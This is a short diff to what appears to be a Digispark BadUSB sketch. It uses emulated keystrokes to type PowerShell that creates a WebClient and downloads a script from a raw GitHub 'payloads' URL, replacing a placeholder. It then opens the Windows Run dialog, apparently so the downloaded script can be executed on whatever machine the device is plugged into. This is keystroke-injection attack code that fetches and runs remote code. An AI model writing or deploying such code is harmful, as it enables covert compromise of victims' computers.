@@ -14,7 +14,7 @@ void loop() {
   DigiKeyboard.print("$client = new-object System.Net.WebClient");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print("$client.DownloadFile(\"https://scriptURL\" , \"script.ps1\")");
+  DigiKeyboard.print("$client.DownloadFile(\"https://raw.githubusercontent.com/mikokill/d-park/main/payloads/execute-powershell-script/powershell-script.ps1\" , \"script.ps1\")");
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT | KEY_R);
   DigiKeyboard.delay(750);
